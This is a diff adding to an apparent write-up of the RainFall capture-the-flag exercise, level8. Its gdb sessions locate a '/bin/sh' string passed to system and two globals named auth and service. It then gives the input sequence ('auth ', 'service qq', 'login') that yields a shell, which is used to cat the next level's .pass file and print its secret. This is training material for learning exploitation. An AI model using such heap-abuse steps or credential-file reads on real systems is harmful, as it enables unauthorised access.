@@ -1,9 +1,16 @@
 _basic binary test_
 ```
-  $> ./level8
-  (nil), (nil)
-  "teststring"
-  (nil), (nil)
+  level8@RainFall:~$ ls
+  level8
+  level8@RainFall:~$ ./level8 
+  (nil), (nil) 
+  test
+  (nil), (nil) 
+  ok
+  (nil), (nil) 
+  ^C
+  level8@RainFall:~$ ^C
+
 ```
 
 _using gdb_
@@ -175,3 +182,29 @@ _and some comparaison_
   (gdb) x/s 0x804882d
   0x804882d: "login"
 ```
+
+_we have a string given to system and some global variable_
+```
+(gdb) x/s 0x8048833
+0x8048833:	 "/bin/sh"
+
+(gdb) info variables
+All defined variables:
+
+Non-debugging symbols:
+[...]
+0x08049aac  auth
+0x08049ab0  service
+```
+
+_we need to type 'auth ', and fill service with a character (????)_
+``` 
+auth 
+0x804a008, (nil) 
+service qq
+0x804a008, 0x804a028 
+login
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
+>**DONE** 
